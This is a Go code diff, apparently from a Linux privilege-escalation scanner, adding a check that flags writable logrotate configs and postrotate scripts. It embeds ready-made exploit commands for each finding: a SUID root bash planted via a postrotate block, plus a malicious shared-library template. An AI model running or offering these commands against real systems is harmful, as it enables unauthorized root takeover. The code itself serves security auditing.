@@ -40,7 +40,8 @@ func init() {
 		&DangerousCapabilitiesChain{},
 		&NfsNoRootSquashChain{},
 		&PolkitDangerousRulesChain{},
-		&SuidWritableLibChain{}, // E4: SUID + Writable Library Path chain
+		&SuidWritableLibChain{},        // E4: SUID + Writable Library Path chain
+		&LogrotateRootChain{},          // E1: Logrotate → Root chain
 	}
 }
 
@@ -823,6 +824,48 @@ func (c *SuidWritableLibChain) Evaluate(report *models.ScanReport) []ChainResult
 			Exploit:     fmt.Sprintf("gcc -shared -fPIC -o %s/evil.so evil.c && %s  # .so is loaded with root privileges", suid.WritableLibraryPaths[0], suid.Path),
 			TargetPath:  suid.Path,
 		})
+	}
+	return results
+}
+
+// ── CHAIN 17: Logrotate → Root Execution (E1) ──────────────────────────────
+// Cross-references writable logrotate configs (from A3 scanner) to confirm
+// a root code-execution chain.
+//
+// Two distinct sub-cases:
+//  1. The logrotate config file itself is writable — attacker can inject any
+//     postrotate command that runs as root the next time logrotate runs.
+//  2. The config is not writable but references a postrotate script that IS
+//     writable — attacker modifies the script, same outcome.
+type LogrotateRootChain struct{}
+
+func (c *LogrotateRootChain) Evaluate(report *models.ScanReport) []ChainResult {
+	var results []ChainResult
+	for _, lr := range report.Logrotate {
+		if lr.IsWritable {
+			// Case 1: the config itself is writable
+			results = append(results, ChainResult{
+				Name:        fmt.Sprintf("Writable logrotate config '%s' → root code execution", lr.ConfigPath),
+				RiskLevel:   "100% CONFIRMED",
+				Description: fmt.Sprintf("Logrotate config %s is writable. Injecting a postrotate block causes arbitrary commands to execute as root on the next log rotation (typically daily via cron/systemd timer).", lr.ConfigPath),
+				Exploit: fmt.Sprintf(
+					"echo -e 'postrotate\n\tcp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\nendscript' >> %s  # wait for logrotate to run → /tmp/rootbash -p",
+					lr.ConfigPath,
+				),
+				TargetPath: lr.ConfigPath,
+			})
+		} else {
+			// Case 2: a referenced postrotate script is writable
+			for _, script := range lr.PostrotatePaths {
+				results = append(results, ChainResult{
+					Name:        fmt.Sprintf("Writable postrotate script '%s' → root code execution", script),
+					RiskLevel:   "100% CONFIRMED",
+					Description: fmt.Sprintf("Logrotate config '%s' calls postrotate script '%s' which is writable. Modifying the script causes it to execute as root during the next log rotation.", lr.ConfigPath, script),
+					Exploit:     fmt.Sprintf("echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> %s  # wait for logrotate → /tmp/rootbash -p", script),
+					TargetPath:  script,
+				})
+			}
+		}
 	}
 	return results
 }
